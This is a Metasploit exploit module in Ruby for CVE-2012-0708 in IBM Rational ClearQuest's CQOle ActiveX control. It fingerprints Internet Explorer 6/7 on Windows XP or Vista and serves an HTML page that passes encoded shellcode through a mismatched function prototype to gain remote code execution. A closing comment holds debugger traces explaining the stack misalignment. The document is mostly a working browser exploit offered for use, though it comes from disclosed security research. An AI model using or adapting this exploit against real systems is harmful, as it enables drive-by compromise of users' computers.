##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::Remote::BrowserAutopwn
	autopwn_info({
		:ua_name    => HttpClients::IE,
		:ua_minver  => "6.0",
		:ua_maxver  => "7.0",
		:javascript => true,
		:os_name    => OperatingSystems::WINDOWS,
		:classid    => "{94773112-72E8-11D0-A42E-00A024DED613}",
		:method     => "RegisterSchemaRepoFromFileByDbSet",
		:rank       => NormalRanking
	})

	def initialize(info={})
		super(update_info(info,
			'Name'           => "IBM Rational ClearQuest CQOle Remote Code Execution",
			'Description'    => %q{
					This module exploits a function prototype mismatch on the CQOle ActiveX
				control in IBM Rational ClearQuest < 7.1.1.9, < 7.1.2.6 or < 8.0.0.2 which
				allows reliable remote code execution when DEP isn't enabled.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Andrea Micalizzi aka rgod', # Vulnerability discovery
					'juan vazquez' # Metasploit module
				],
			'References'     =>
				[
					[ 'CVE', '2012-0708' ],
					[ 'BID', '53170' ],
					[ 'OSVDB', '81443'],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-12-113/' ],
					[ 'URL', 'http://www-304.ibm.com/support/docview.wss?uid=swg21591705' ],
				],
			'Payload'        =>
				{
					'BadChars' => "\x00"
				},
			'DefaultOptions'  =>
				{
					'ExitFunction'         => "process",
					'InitialAutoRunScript' => 'migrate -f'
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# cqole.dll 7.1100.0.150
					[ 'Automatic', {} ],
					[ 'IE 6 / IE7 (No DEP)', {} ], # Because of the nature of the vulnerability no DEP is a requisite
				],
			'Privileged'     => false,
			'DisclosureDate' => "May 19 2012",
			'DefaultTarget'  => 0))
	end

	def get_target(agent)
		#If the user is already specified by the user, we'll just use that
		return target if target.name != 'Automatic'

		if agent =~ /NT 5\.1/ and agent =~ /MSIE 6/
			return targets[1]  #IE 6 on Windows XP
		elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 7/
			return targets[1]  #IE 7 on Windows XP
		elsif agent =~ /NT 6\.0/ and agent =~ /MSIE 7/
			return targets[1]  #IE 7 on Windows Vista
		else
			return nil
		end
	end

	def on_request_uri(cli, request)
		agent = request.headers['User-Agent']
		my_target = get_target(agent)

		# Avoid the attack if the victim doesn't have the same setup we're targeting
		if my_target.nil?
			print_error("#{cli.peerhost}:#{cli.peerport} - Browser not supported: #{agent.to_s}")
			send_not_found(cli)
			return
		end

		js_code = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(my_target.arch))
		object_id = rand_text_alpha(rand(8) + 4)
		dbset_value = rand_text_alpha(rand(8) + 4)
		var_payload = rand_text_alpha(rand(8) + 4)

		html = <<-EOS
		<html>
		<body>
		<object id='#{object_id}' classid='clsid:94773112-72E8-11D0-A42E-00A024DED613'></object>
		<script language="JavaScript">
		var #{var_payload} = unescape("#{js_code}")
		#{object_id}.RegisterSchemaRepoFromFileByDbSet("#{dbset_value}", #{var_payload});
		</script>
		</body>
		</html>
		EOS

		html = html.gsub(/^\t\t/, '')

		print_status("#{cli.peerhost}:#{cli.peerport} - Sending html")
		send_response(cli, html, {'Content-Type'=>'text/html'})

	end

end

=begin

* RegisterSchemaRepoFromFile and no RegisterSchemaRepoFromFileByDbSet is called:

Breakpoint 0 hit
eax=3190b1a0 ebx=00000000 ecx=03015cf0 edx=7835f5d2 esi=0013e200 edi=0000000c
eip=78371062 esp=0013e204 ebp=0013e2b4 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
MFC80U!_AfxDispatchCall+0xe:
78371062 ffd0            call    eax {cqole!OAdSession::RegisterSchemaRepoFromFile (3190b1a0)}

* RegisterSchemaRepoFromFile prototype (it is going to be executed):

.text:31865E40 ; protected: wchar_t * __thiscall OAdAdminSession::RegisterSchemaRepoFromFile(wchar_t const *)

his ret is: retn    4

* RegisterSchemaRepoFromFileByDbSet prototype (it should be executed):

.text:31866280 ; protected: wchar_t * __thiscall OAdAdminSession::RegisterSchemaRepoFromFileByDbSet(wchar_t const *, wchar_t const *)

his ret is: retn    8

* When RegisterSchemaRepoFromFile returns to MFC80U!_AfxDispatchCall it is what happens:

0:000> p
eax=00186864 ebx=00000000 ecx=442d618d edx=00070001 esi=0013e200 edi=0000000c
eip=78371064 esp=0013e208 ebp=0013e2b4 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
MFC80U!_AfxDispatchCall+0x10:
78371064 c3              ret
0:000> dd esp
0013e208  001dcff4 7835f5d2 fffffffe 78336a3a

ESP is pointing to the second argument of RegisterSchemaRepoFromFileByDbSet and no to the stored EIP on
the stack. The ret from MFC80U!_AfxDispatchCall allows to get control on a reliable way when DEP is
disabled

=end